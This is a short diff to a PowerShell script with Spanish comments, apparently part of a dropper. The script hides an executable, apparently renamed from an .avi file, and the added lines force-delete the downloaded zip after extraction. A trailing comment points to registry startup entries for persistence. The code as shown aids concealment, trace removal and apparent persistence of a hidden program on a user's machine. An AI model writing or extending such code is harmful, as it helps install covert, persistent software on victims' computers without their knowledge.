@@ -43,7 +43,8 @@ if (Test-Path $rutaArchivoAvi) {
 # Opcionalmente, establecer el archivo renombrado como oculto
 $atributosOcultos = (Get-Item $rutaArchivoExe).Attributes -bor [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $rutaArchivoExe -Name Attributes -Value $atributosOcultos
-
+# Borrar el archivo zip después de la extracción
+Remove-Item -Path $rutaLocalZip -Force
 
 
 # Registry path for the startup entries
